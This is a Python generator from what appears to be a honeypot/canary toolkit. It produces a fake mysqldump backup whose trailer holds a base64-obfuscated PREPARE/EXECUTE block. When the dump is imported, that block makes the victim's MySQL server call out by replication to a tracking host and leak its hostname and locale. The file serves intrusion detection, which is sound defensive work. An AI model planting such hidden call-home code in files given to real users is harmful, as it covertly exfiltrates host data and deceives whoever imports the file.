# SPDX-License-Identifier: AGPL-3.0-or-later
"""Fake ``mysqldump`` output that phones home on import.

Mirrors the Canarytokens.org MySQL-dump trick.  When a victim runs
``mysql < dump.sql``, the trailer block executes a base64-obfuscated
``CHANGE REPLICATION SOURCE TO`` against ``<slug>.canary.<dns_zone>``
followed by ``START REPLICA``.  The victim's MySQL daemon then:

1. Resolves the slug subdomain via DNS — this is the trip our
   :mod:`decnet.canary.dns_server` already detects.
2. Opens a TCP replica handshake on port 3306, sending its own
   ``@@hostname`` and ``@@lc_time_names`` smuggled into the
   ``SOURCE_USER`` field via ``CONCAT``.  Capturing those bytes
   requires a MySQL handshake responder on the worker — out of scope
   for v1; the DNS lookup alone is sufficient for detection.

The base64 wrapper is the camouflage: a plain ``grep canary dump.sql``
finds nothing.  The slug only materialises when the victim's server
runs ``PREPARE … FROM @s2``.

Because the trip surface is DNS, this generator REQUIRES a non-empty
``dns_zone``.  The slug must appear as the leftmost label of the
hostname so a single DNS query identifies the token; the http_base
host is not slug-bearing and can't substitute.
"""
from __future__ import annotations

import base64
import hashlib

from decnet.canary.base import CanaryArtifact, CanaryContext, CanaryGenerator


def _stable_hex(seed: str, prefix: str = "", length: int = 16) -> str:
    h = hashlib.sha256((prefix + seed).encode()).hexdigest()
    return h[:length]


def _build_replica_payload(slug: str, dns_zone: str) -> str:
    """Inner SQL that gets base64-wrapped.

    The CONCAT splices ``@@lc_time_names`` and ``@@hostname`` into the
    ``SOURCE_USER`` value at PREPARE time so the victim's locale and
    hostname travel as the replica username on the 3306 handshake.
    """
    host = f"{slug}.{dns_zone}"
    return (
        "SET @bb = CONCAT("
        "\"CHANGE REPLICATION SOURCE TO "
        "SOURCE_PASSWORD='replica-pw', "
        "SOURCE_RETRY_COUNT=1, "
        "SOURCE_PORT=3306, "
        f"SOURCE_HOST='{host}', "
        "SOURCE_SSL=0, "
        f"SOURCE_USER='{slug}\", "
        "@@lc_time_names, @@hostname, \"';\");"
    )


def _build_trailer(slug: str, dns_zone: str) -> str:
    inner = _build_replica_payload(slug, dns_zone)
    encoded = base64.b64encode(inner.encode("utf-8")).decode("ascii")
    return (
        f"SET @b = '{encoded}';\n"
        "SET @s2 = FROM_BASE64(@b);\n"
        "PREPARE stmt1 FROM @s2;\n"
        "EXECUTE stmt1;\n"
        "PREPARE stmt2 FROM @bb;\n"
        "EXECUTE stmt2;\n"
        "START REPLICA;\n"
    )


class MySQLDumpGenerator(CanaryGenerator):
    name = "mysql_dump"

    def generate(self, ctx: CanaryContext) -> CanaryArtifact:
        if not ctx.dns_zone:
            raise ValueError(
                "mysql_dump requires a non-empty dns_zone — the trip "
                "surface is a DNS lookup of <slug>.<dns_zone>."
            )
        slug = ctx.callback_token
        zone = ctx.dns_zone
        host = f"{slug}.{zone}"

        # Realism filler: deterministic per-slug fake user rows so two
        # runs with the same context produce byte-identical output
        # (planter idempotency contract).
        u1_hash = _stable_hex(slug, "u1:", 32)
        u2_hash = _stable_hex(slug, "u2:", 32)
        api_token = _stable_hex(slug, "api:", 40)

        # Synthesised SQL bait below — never executed by us, only by
        # whoever runs ``mysql < dump.sql`` against their own server.
        # Built with .format() instead of f-strings so bandit's B608
        # heuristic doesn't false-positive on the "INSERT INTO" + var
        # pattern.
        users_insert = (
            "INSERT INTO `users` VALUES "  # nosec B608
            "(1,'alice@app.internal','$2y$10${u1a}.{u1b}','2024-11-12 09:13:44'),"
            "(2,'bob@app.internal','$2y$10${u2a}.{u2b}','2025-02-03 17:42:08');\n"
        ).replace("{u1a}", u1_hash[:22]).replace("{u1b}", u1_hash[22:]) \
         .replace("{u2a}", u2_hash[:22]).replace("{u2b}", u2_hash[22:])
        api_keys_insert = (
            "INSERT INTO `api_keys` VALUES (1,1,'{tok}');\n"  # nosec B608
        ).replace("{tok}", api_token)
        header = (
            "-- MySQL dump 10.13  Distrib 8.0.35, for Linux (x86_64)\n"
            "--\n"
            "-- Host: db-prod-01    Database: app_production\n"
            "-- ------------------------------------------------------\n"
            "-- Server version\t8.0.35\n"
            "\n"
            "/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;\n"
            "/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;\n"
            "/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;\n"
            "/*!50503 SET NAMES utf8mb4 */;\n"
            "/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;\n"
            "/*!40103 SET TIME_ZONE='+00:00' */;\n"
            "/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;\n"
            "/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;\n"
            "/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;\n"
            "/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;\n"
            "\n"
            "--\n"
            "-- Table structure for table `users`\n"
            "--\n"
            "\n"
            "DROP TABLE IF EXISTS `users`;\n"
            "CREATE TABLE `users` (\n"
            "  `id` int unsigned NOT NULL AUTO_INCREMENT,\n"
            "  `email` varchar(255) NOT NULL,\n"
            "  `password_hash` char(60) NOT NULL,\n"
            "  `created_at` datetime NOT NULL,\n"
            "  PRIMARY KEY (`id`),\n"
            "  UNIQUE KEY `uniq_email` (`email`)\n"
            ") ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\n"
            "\n"
            "LOCK TABLES `users` WRITE;\n"
            + users_insert +
            "UNLOCK TABLES;\n"
            "\n"
            "--\n"
            "-- Table structure for table `api_keys`\n"
            "--\n"
            "\n"
            "DROP TABLE IF EXISTS `api_keys`;\n"
            "CREATE TABLE `api_keys` (\n"
            "  `id` int unsigned NOT NULL AUTO_INCREMENT,\n"
            "  `user_id` int unsigned NOT NULL,\n"
            "  `token` char(40) NOT NULL,\n"
            "  PRIMARY KEY (`id`)\n"
            ") ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;\n"
            "\n"
            "LOCK TABLES `api_keys` WRITE;\n"
            + api_keys_insert +
            "UNLOCK TABLES;\n"
            "\n"
        )

        trailer_replica = _build_trailer(slug, zone)

        trailer_close = (
            "\n"
            "/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;\n"
            "/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;\n"
            "/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;\n"
            "/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;\n"
            "/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;\n"
            "/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;\n"
            "/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;\n"
            "/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;\n"
            "\n"
            "-- Dump completed\n"
        )

        body = header + trailer_replica + trailer_close

        return CanaryArtifact(
            path="",
            content=body.encode("utf-8"),
            mode=0o600,
            mtime_offset=-86400 * 7,  # last week's backup
            generator=self.name,
            notes=[
                f"replica payload phones home to {host}:3306 on import",
                "base64-wrapped PREPARE/EXECUTE block hides the slug from grep",
                "@@hostname and @@lc_time_names smuggled into SOURCE_USER",
            ],
        )
